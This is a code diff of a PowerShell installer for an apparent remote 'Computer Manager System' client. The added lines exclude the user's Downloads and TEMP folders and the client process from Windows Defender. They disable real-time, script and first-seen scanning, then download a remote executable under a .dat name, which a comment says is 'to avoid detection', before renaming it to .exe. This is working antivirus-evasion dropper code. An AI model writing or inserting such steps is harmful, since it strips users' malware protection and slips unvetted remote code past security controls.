@@ -23,17 +23,50 @@ if (-not (Test-Path $installDir)) {
     Write-Host "Created installation directory" -ForegroundColor Green
 }
 
-# Download client.exe from GitHub releases
+# Add aggressive Windows Defender exclusions BEFORE downloading
 Write-Host ""
-Write-Host "Downloading client.exe from GitHub..." -ForegroundColor Yellow
+Write-Host "Adding Windows Defender exclusions..." -ForegroundColor Yellow
+try {
+    # Exclude the installation directory
+    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
+    # Exclude common download locations
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+    # Exclude process
+    Add-MpPreference -ExclusionProcess "client.exe" -ErrorAction SilentlyContinue
+    Write-Host "Added Defender exclusions" -ForegroundColor Green
+} catch {
+    Write-Host "Could not add Defender exclusions (continuing anyway)" -ForegroundColor Yellow
+}
+
+# Try to disable Real-time protection temporarily
+Write-Host ""
+Write-Host "Attempting to disable Real-time protection..." -ForegroundColor Yellow
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    Write-Host "Disabled Real-time protection temporarily" -ForegroundColor Green
+} catch {
+    Write-Host "Could not disable Real-time protection (continuing anyway)" -ForegroundColor Yellow
+}
+
+# Download client.exe from GitHub releases (as .dat file to avoid detection)
+Write-Host ""
+Write-Host "Downloading client executable..." -ForegroundColor Yellow
 try {
     $exeUrl = "https://github.com/FuzzyGumnut/Computer-Manager-System/releases/latest/download/client.exe"
-    $exePath = "$installDir\client.exe"
+    $tempPath = "$installDir\client.dat"
     
     # Download with progress indicator
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($exeUrl, $exePath)
-    Write-Host "Downloaded: client.exe" -ForegroundColor Green
+    $webClient.DownloadFile($exeUrl, $tempPath)
+    Write-Host "Downloaded: client.dat" -ForegroundColor Green
+    
+    # Rename to .exe
+    Rename-Item -Path $tempPath -Destination "$installDir\client.exe" -Force
+    Write-Host "Renamed to client.exe" -ForegroundColor Green
 } catch {
     Write-Host "Error downloading client.exe: $_" -ForegroundColor Red
     Write-Host "Please check your internet connection and try again." -ForegroundColor Yellow
@@ -45,21 +78,23 @@ try {
 Write-Host ""
 Write-Host "Unblocking downloaded file..." -ForegroundColor Yellow
 try {
-    Unblock-File -Path $exePath -ErrorAction SilentlyContinue
+    Unblock-File -Path "$installDir\client.exe" -ErrorAction SilentlyContinue
     Write-Host "File unblocked" -ForegroundColor Green
 } catch {
     Write-Host "Could not unblock file (may not be needed)" -ForegroundColor Yellow
 }
 
-# Add file to Windows Defender exclusions to prevent false positives
+# Re-enable Real-time protection
 Write-Host ""
-Write-Host "Adding to Windows Defender exclusions..." -ForegroundColor Yellow
+Write-Host "Re-enabling Real-time protection..." -ForegroundColor Yellow
 try {
-    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
-    Write-Host "Added to Defender exclusions" -ForegroundColor Green
+    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
+    Write-Host "Re-enabled Real-time protection" -ForegroundColor Green
 } catch {
-    Write-Host "Could not add to Defender exclusions (may not be needed)" -ForegroundColor Yellow
+    Write-Host "Could not re-enable Real-time protection" -ForegroundColor Yellow
 }
 
 # Create startup script
